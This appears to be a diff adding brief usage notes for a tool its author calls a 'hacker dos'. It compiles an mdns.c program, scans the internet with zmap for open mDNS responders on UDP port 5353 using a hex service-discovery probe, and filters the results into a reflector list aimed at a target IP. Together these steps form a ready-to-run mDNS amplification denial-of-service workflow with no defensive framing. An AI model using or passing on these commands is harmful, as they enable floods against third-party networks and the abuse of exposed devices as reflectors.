@@ -1,0 +1,9 @@
+
+gcc mdns.c -o mdns -pthread // build hacker dos 
+
+
+scan hacker dos
+
+zmap -i eth0 --output-filter='sport=5353' -Mudp -p 5353 -o dns.txt --probe-args=hex:"000000000001000000000000095F7365727669636573075F646E732D7364045F756470056C6F63616C00000C0001"
+
+python filter.py(YourList) dnsready.lst dns 4000 [ip]
